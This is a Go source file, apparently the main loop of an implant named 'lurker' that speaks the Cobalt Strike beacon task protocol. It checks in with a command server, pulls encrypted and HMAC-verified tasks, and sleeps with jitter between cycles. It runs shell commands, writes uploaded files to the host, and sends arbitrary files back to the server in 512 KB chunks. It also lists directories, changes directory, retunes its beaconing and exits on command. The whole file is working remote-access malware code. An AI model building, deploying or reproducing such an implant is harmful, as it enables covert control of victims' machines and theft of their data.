package main

import (
	"bytes"
	"crypto/hmac"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"time"

	"lurker/lurker/commands"
	"lurker/lurker/constants"
	"lurker/lurker/cryptography"
	"lurker/lurker/transports"
	"lurker/lurker/utilities"
)

// Stateful download — one chunk per callback cycle
type pendingDownload struct {
	file       *os.File
	reqIDBytes []byte
	taskID     [8]byte
}

var activeDownload *pendingDownload

func main() {
	ok := transports.InitialCallback()
	if ok {
		for {
			resp := transports.PullCommand()
			if resp != nil {
				if err := processResponse(resp); err != nil {
					fmt.Printf("!error processing response: %v\n", err)
				}
			}
			serviceDownload()
			transports.FlushResults()
			sleepWithJitter()
		}
	}
}

func sleepWithJitter() {
	base := constants.SleepTime
	jitter := constants.SleepJitter
	if jitter <= 0 || base <= 0 {
		time.Sleep(base)
		return
	}
	minSleep := float64(base) * (1.0 - float64(jitter)/100.0)
	maxSleep := float64(base)
	actual := minSleep + rand.Float64()*(maxSleep-minSleep)
	time.Sleep(time.Duration(actual))
}

// serviceDownload reads one chunk from an active download and queues it
func serviceDownload() {
	dl := activeDownload
	if dl == nil {
		return
	}
	buf := make([]byte, 512*1024)
	n, err := dl.file.Read(buf)
	if n > 0 {
		chunk := utilities.BytesCombine(dl.reqIDBytes, buf[:n])
		pkt := transports.MakePacket(commands.CALLBACK_FILE_WRITE, dl.taskID, chunk)
		transports.QueueResult(pkt)
	}
	if err != nil || n == 0 {
		pkt := transports.MakePacket(commands.CALLBACK_FILE_CLOSE, dl.taskID, dl.reqIDBytes)
		transports.QueueResult(pkt)
		dl.file.Close()
		activeDownload = nil
	}
}

func processResponse(resp *http.Response) error {
	bodybytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("reading response body: %w", err)
	}
	decoded_body, err := base64.RawURLEncoding.DecodeString(string(bodybytes))
	if err != nil {
		return fmt.Errorf("base64 decoding: %w", err)
	}
	totalLen := len(decoded_body)
	if totalLen <= cryptography.HmacHashLen {
		return nil // empty or too short — no tasks
	}

	// HMAC verification
	ciphertext := decoded_body[:totalLen-cryptography.HmacHashLen]
	receivedHmac := decoded_body[totalLen-cryptography.HmacHashLen:]
	expectedHmac := cryptography.HmacHash(ciphertext)
	if !hmac.Equal(receivedHmac, expectedHmac) {
		return fmt.Errorf("HMAC verification failed")
	}

	decrypted, err := transports.DecryptPacket(ciphertext)
	if err != nil {
		return fmt.Errorf("decryption: %w", err)
	}
	if len(decrypted) < 8 {
		return fmt.Errorf("decrypted data too short: %d bytes", len(decrypted))
	}

	lenBytes := decrypted[4:8]
	transportsLen := transports.ReadInt(lenBytes)
	if transportsLen == 0 {
		return nil // no task data
	}

	taskData := decrypted[8:]

	// Auto-detect CS 4.9 vs 4.12 task format
	taskHeaderLen := transports.DetectTaskHeaderLen(taskData, transportsLen)

	decryptedBuf := bytes.NewBuffer(taskData)
	for {
		if transportsLen <= 0 {
			break
		}
		cmdType, taskID, cmdBuf, err := transports.ParsePacket(decryptedBuf, &transportsLen, taskHeaderLen)
		if err != nil {
			return fmt.Errorf("parsing packet: %w", err)
		}
		if cmdBuf != nil {
			executeCommand(cmdType, taskID, cmdBuf)
		}
	}
	return nil
}

func executeCommand(cmdType uint32, taskID [8]byte, cmdBuf []byte) {
	switch cmdType {
	case commands.CMD_TYPE_SHELL:
		shellPath, shellBuf := commands.ParseCommandShell(cmdBuf)
		result := commands.Shell(shellPath, shellBuf)

		constants.NextJobNum++
		jobNum := constants.NextJobNum
		jobNumBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(jobNumBytes, uint32(jobNum))

		// Type 58 (PROCESS_STARTED): [jobNum:4] + "process\0"
		startedData := utilities.BytesCombine(jobNumBytes, []byte("process\x00"))
		transports.QueueResult(transports.MakePacket(commands.CALLBACK_PROCESS_STARTED, taskID, startedData))

		// Type 56 (OUTPUT_JOBS): [jobNum:4][0:4][0:4][output_text]
		pad := make([]byte, 4)
		outputData := utilities.BytesCombine(jobNumBytes, pad, pad, result)
		transports.QueueResult(transports.MakePacket(commands.CALLBACK_OUTPUT_JOBS, taskID, outputData))

		// Type 59 (PROCESS_COMPLETED): [jobNum:4]
		transports.QueueResult(transports.MakePacket(commands.CALLBACK_PROCESS_COMPLETED, taskID, jobNumBytes))

	case commands.CMD_TYPE_UPLOAD_START:
		filePath, fileData := commands.ParseCommandUpload(cmdBuf)
		filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
		commands.Upload(filePathStr, fileData)

	case commands.CMD_TYPE_UPLOAD_LOOP:
		filePath, fileData := commands.ParseCommandUpload(cmdBuf)
		filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
		commands.Upload(filePathStr, fileData)

	case commands.CMD_TYPE_DOWNLOAD:
		filePath := cmdBuf
		strFilePath := strings.ReplaceAll(string(filePath), "\\", "/")
		fileInfo, err := os.Stat(strFilePath)
		if err != nil {
			return
		}
		fileLen := int(fileInfo.Size())
		fileLenBytes := transports.WriteInt(fileLen)
		requestID := cryptography.RandomInt(10000, 99999)
		requestIDBytes := transports.WriteInt(requestID)

		// Queue the download start (type 2)
		result := utilities.BytesCombine(requestIDBytes, fileLenBytes, filePath)
		transports.QueueResult(transports.MakePacket(commands.CALLBACK_FILE, taskID, result))

		// Open file and set up stateful download — chunks sent one per cycle
		fileHandle, err := os.Open(strFilePath)
		if err != nil {
			return
		}
		activeDownload = &pendingDownload{
			file:       fileHandle,
			reqIDBytes: requestIDBytes,
			taskID:     taskID,
		}

	case commands.CMD_TYPE_FILE_BROWSE:
		dirResult := commands.File_Browse(cmdBuf, taskID)
		transports.QueueResult(transports.MakePacket(commands.CALLBACK_FILE_BROWSE, taskID, dirResult))

	case commands.CMD_TYPE_CD:
		commands.ChangeCurrentDir(cmdBuf, taskID)

	case commands.CMD_TYPE_SLEEP:
		if len(cmdBuf) >= 8 {
			sleep := transports.ReadInt(cmdBuf[:4])
			jitter := transports.ReadInt(cmdBuf[4:8])
			constants.SleepTime = time.Duration(sleep) * time.Millisecond
			constants.SleepJitter = int(jitter)
		} else if len(cmdBuf) >= 4 {
			sleep := transports.ReadInt(cmdBuf[:4])
			constants.SleepTime = time.Duration(sleep) * time.Millisecond
			constants.SleepJitter = 0
		}

	case commands.CMD_TYPE_PWD:
		pwdResult := commands.GetCurrentDirectory(taskID)
		transports.QueueResult(transports.MakePacket(commands.CALLBACK_PWD, taskID, pwdResult))

	case commands.CMD_TYPE_EXIT:
		// Queue exit callback, flush immediately, then die
		transports.QueueResult(transports.MakePacket(commands.CALLBACK_DEAD, taskID, nil))
		transports.FlushResults()
		os.Exit(0)

	default:
		errIdBytes := transports.WriteInt(0)
		arg1Bytes := transports.WriteInt(0)
		arg2Bytes := transports.WriteInt(0)
		errMsgBytes := []byte("")
		result := utilities.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
		transports.QueueResult(transports.MakePacket(commands.CALLBACK_ERROR, taskID, result))
	}
}
